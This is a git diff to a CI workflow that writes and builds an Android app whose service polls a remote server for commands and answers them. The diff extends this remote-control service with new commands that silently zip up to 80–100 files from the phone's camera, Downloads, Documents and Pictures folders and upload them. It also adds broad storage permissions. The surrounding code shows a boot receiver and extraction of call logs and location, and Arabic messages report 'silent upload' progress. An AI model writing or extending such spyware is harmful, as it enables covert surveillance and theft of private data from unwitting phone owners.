@@ -27,7 +27,6 @@ jobs:
         run: |
           mkdir -p app/src/main/java/com/uranium/fist app/src/main/res/values app/src/main/assets
           
-          # AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -46,6 +45,8 @@ jobs:
               <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
               <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
               <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
 
               <application
                   android:allowBackup="true"
@@ -87,7 +88,6 @@ jobs:
           </manifest>
           EOF
 
-          # MainActivity.kt
           cat << 'EOF' > app/src/main/java/com/uranium/fist/MainActivity.kt
           package com.uranium.fist
 
@@ -117,6 +117,7 @@ jobs:
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                       permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
                       permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
+                      permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO)
                   } else {
                       permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                   }
@@ -145,7 +146,6 @@ jobs:
           }
           EOF
 
-          # BootReceiver.kt
           cat << 'EOF' > app/src/main/java/com/uranium/fist/BootReceiver.kt
           package com.uranium.fist
 
@@ -166,7 +166,6 @@ jobs:
           }
           EOF
 
-          # SyncService.kt
           cat << 'EOF' > app/src/main/java/com/uranium/fist/SyncService.kt
           package com.uranium.fist
 
@@ -176,12 +175,12 @@ jobs:
           import android.app.Service
           import android.content.Context
           import android.content.Intent
-          import android.content.pm.PackageManager
           import android.database.Cursor
           import android.location.Location
           import android.location.LocationManager
           import android.net.Uri
           import android.os.Build
+          import android.os.Environment
           import android.os.IBinder
           import android.os.PowerManager
           import android.provider.ContactsContract
@@ -271,7 +270,9 @@ jobs:
                                           val callsData = readCallLogs()
                                           sendReportToServer(deviceId, nodeModel, callsData)
                                       } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                          compressAndUploadOnDisk(deviceId, nodeModel)
+                                          compressAndUploadFolder(deviceId, nodeModel, "Camera & DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                      } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
+                                          compressAndUploadStorage(deviceId, nodeModel)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       } else if (responseStr.contains("EXTRACT_LOCATION")) {
@@ -285,7 +286,6 @@ jobs:
                               }
                               conn.disconnect()
 
-                              // الحفاظ على السيرفر نشطاً بدون إزعاج (كل 10 دقائق)
                               delay(600000L)
                           } catch (e: Exception) {
                               delay(60000L)
@@ -387,32 +387,35 @@ jobs:
                   return sb.toString()
               }
 
-              private fun compressAndUploadOnDisk(nodeId: String, nodeModel: String) {
+              private fun compressAndUploadFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
                   serviceScope.launch {
                       try {
-                          val zipFile = File(cacheDir, "Uranium_Harvest_${System.currentTimeMillis()}.zip")
+                          sendReportToServer(nodeId, nodeModel, "🔍 [جارٍ الفحص] تم تحديد مجلد [$folderName]. جاري جرد الملفات...")
+                          
+                          val zipFile = File(cacheDir, "Uranium_${folderName.replace(" ", "_")}_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
                           
-                          val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                           val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
                           val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-                          val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
+                          val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
                           var addedCount = 0
+                          var totalBytes = 0L
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                               val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext() && addedCount < 50) {
+                              while (it.moveToNext() && addedCount < 80) {
                                   if (dataIdx != -1 && nameIdx != -1) {
                                       val filePath = it.getString(dataIdx)
                                       val fileName = it.getString(nameIdx)
                                       val file = File(filePath)
                                       if (file.exists() && file.isFile) {
                                           try {
-                                              zipOut.putNextEntry(ZipEntry("DCIM/$fileName"))
+                                              zipOut.putNextEntry(ZipEntry("$folderName/$fileName"))
                                               file.inputStream().use { fis -> fis.copyTo(zipOut) }
                                               zipOut.closeEntry()
                                               addedCount++
+                                              totalBytes += file.length()
                                           } catch (e: Exception) {
                                               // Skip
                                           }
@@ -423,12 +426,65 @@ jobs:
                           zipOut.close()
 
                           if (addedCount > 0 && zipFile.exists()) {
+                              val sizeMB = totalBytes / (1024.0 * 1024.0)
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم تحديد المجلد] مجلد [$folderName] يحتوي على <b>$addedCount ملفاً</b> بإجمالي حجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الضغط والرفع الصامد...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ خطأ: لم يتم العثور على وسائط للضغط.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات في مجلد [$folderName].")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في ضغط اليورانيوم: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة المجلد [$folderName]:${e.message}")
+                      }
+                  }
+              }
+
+              private fun compressAndUploadStorage(nodeId: String, nodeModel: String) {
+                  serviceScope.launch {
+                      try {
+                          sendReportToServer(nodeId, nodeModel, "🔍 [جارٍ الفحص الشامل] تم تحديد مسار التخزين ومجلد Download. جاري جرد الملفات...")
+                          
+                          val zipFile = File(cacheDir, "Uranium_Full_Storage_${System.currentTimeMillis()}.zip")
+                          val zipOut = ZipOutputStream(FileOutputStream(zipFile))
+
+                          val targetDirs = listOf(
+                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
+                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
+                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+                              Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
+                          )
+
+                          var addedCount = 0
+                          var totalBytes = 0L
+
+                          for (dir in targetDirs) {
+                              if (dir != null && dir.exists() && dir.isDirectory) {
+                                  dir.walkTopDown().forEach { file ->
+                                      if (file.isFile && addedCount < 100) {
+                                          try {
+                                              val relPath = file.relativeTo(Environment.getExternalStorageDirectory()).path
+                                              zipOut.putNextEntry(ZipEntry(relPath))
+                                              file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                              zipOut.closeEntry()
+                                              addedCount++
+                                              totalBytes += file.length()
+                                          } catch (e: Exception) {
+                                              // Skip
+                                          }
+                                      }
+                                  }
+                              }
+                          }
+                          zipOut.close()
+
+                          if (addedCount > 0 && zipFile.exists()) {
+                              val sizeMB = totalBytes / (1024.0 * 1024.0)
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم تحديد التخزين] تم العثور على <b>$addedCount ملفاً</b> في Download والتخزين الشامل بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
+                              uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
+                          } else {
+                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين العام.")
+                          }
+                      } catch (e: Exception) {
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب التخزين الشامل: ${e.message}")
                       }
                   }
               }
@@ -533,7 +589,6 @@ jobs:
           }
           EOF
 
-          # app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
